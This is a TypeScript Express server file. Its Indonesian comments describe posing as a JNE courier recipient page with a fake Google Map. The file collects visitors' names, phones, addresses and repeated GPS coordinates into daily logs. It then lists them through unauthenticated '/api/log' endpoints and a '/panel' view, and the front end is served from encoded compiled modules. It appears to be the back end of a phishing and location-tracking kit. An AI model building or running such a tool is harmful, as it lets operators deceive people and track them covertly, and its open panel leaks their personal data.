import fs from "fs";
import path from "path";

import express from "express";
import cors from "cors";
import helmet from "helmet";
import morgan from "morgan";
import dotenv from "dotenv";

// compiled
import { getDecodedFile as getDecodedFilePublic } from "./public_compiled";
import { getDecodedFile as getDecodedFilePanel } from "./panel_compiled";

dotenv.config({
  path: ".env",
});

const app = express();

app.use(cors());
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
          "'self'",
          "'unsafe-inline'",
          "'unsafe-hashes'",
          "https://unpkg.com",
        ],
        scriptSrcAttr: ["'unsafe-inline'"],
        styleSrc: ["'self'", "'unsafe-inline'", "https://unpkg.com"],
        imgSrc: ["'self'", "data:", "https:", "http:", "blob:"],
        connectSrc: ["'self'", "https://unpkg.com"],
        fontSrc: ["'self'", "https:", "data:"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
      },
    },
  })
);
app.use(morgan("dev"));
app.use(express.json());

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

interface IMaps {
  latitude: number;
  longitude: number;
  timestamp: string;
}
interface ILog {
  id: string;
  name: string;
  phone: string;
  address: string;
  maps: IMaps[];
  lastUpdate: string;
}

const logPath = path.join(__dirname, "logs");
// jika belum ada folder logs, buat folder logs
if (!fs.existsSync(logPath)) {
  fs.mkdirSync(logPath);
}

app.get("/api/logs", (_req, res) => {
  const logFiles = fs.readdirSync(logPath);
  res.json({
    message: "ok!",
    data: logFiles.map((file) => file.split(".")[0]),
  });
});
app.get("/api/log/:date", (req, res) => {
  const date = req.params.date;
  const logFiles = fs.readdirSync(logPath);
  const dateLog = logFiles.find((file) => file.startsWith(date));
  if (!dateLog) {
    return res.status(404).json({ message: "Log not found" });
  }

  const filePath = path.join(logPath, dateLog);
  const fileData = fs.readFileSync(filePath, "utf-8");
  const logData = JSON.parse(fileData);
  res.json({
    message: "ok!",
    data: logData.map((log: ILog) => ({
      id: log.id,
      name: log.name,
    })),
  });
});
app.get("/api/log/:date/:id", (req, res) => {
  const date = req.params.date;
  const id = req.params.id;
  const logFiles = fs.readdirSync(logPath);
  const dateLog = logFiles.find((file) => file.startsWith(date));
  if (!dateLog) {
    return res.status(404).json({ message: "Log not found" });
  }
  const filePath = path.join(logPath, dateLog);
  const fileData = fs.readFileSync(filePath, "utf-8");
  const logData = JSON.parse(fileData);
  const log = logData.find((log: ILog) => log.id === id);
  res.json({
    message: "ok!",
    data: log,
  });
});

interface ILocationBody {
  // identitas penerima JNE
  id: string; // generate random string
  name: string; // optional
  phone: string; // optional
  address: string; // optional
  // pilih wahana pengiriman
  // sok2an google map
  latitude: number;
  longitude: number;
}
app.post("/api/location", (req, res) => {
  const body = req.body as ILocationBody;
  if (!body.id) {
    return res.status(400).json({ message: "Missing id" });
  }
  if (!body.latitude || !body.longitude) {
    return res.status(400).json({ message: "Missing latitude or longitude" });
  }

  // log file ke folder logs
  const now = new Date();
  const logFile = path.join(
    logPath,
    `${now.getFullYear()}-${now.getMonth() + 1}-${now.getDate()}.json`
  );
  if (!fs.existsSync(logFile)) {
    fs.writeFileSync(logFile, "[]");
  }
  const logData = JSON.parse(fs.readFileSync(logFile, "utf-8"));
  const existingLog = logData.find((log: ILog) => log.id === body.id);
  if (existingLog) {
    // push map
    existingLog.maps.push({
      latitude: body.latitude,
      longitude: body.longitude,
      timestamp: now.toISOString(),
    });
    existingLog.lastUpdate = now.toISOString();
  } else {
    logData.push({
      id: body.id,
      name: body.name,
      phone: body.phone,
      address: body.address,
      lastUpdate: now.toISOString(),
      maps: [
        {
          latitude: body.latitude,
          longitude: body.longitude,
          timestamp: now.toISOString(),
        },
      ],
    });
  }
  fs.writeFileSync(logFile, JSON.stringify(logData));

  res.json({ message: "ok!" });
});

app.use((req, res) => {
  let endpoint = req.path;

  let isPanel = false;
  if (endpoint.startsWith("/panel")) {
    isPanel = true;
  }

  if (endpoint === "/") {
    endpoint = "/index.html";
  } else if (endpoint === "/panel") {
    endpoint = "/index.html";
  } else if (endpoint.startsWith("/panel/")) {
    endpoint = endpoint.replace("/panel/", "/");
  }

  const file = isPanel
    ? getDecodedFilePanel(endpoint)
    : getDecodedFilePublic(endpoint);
  if (!file) {
    return res.status(404).send("File not found");
  }
  res.set("Content-Type", file.type);
  res.send(file.content);
});
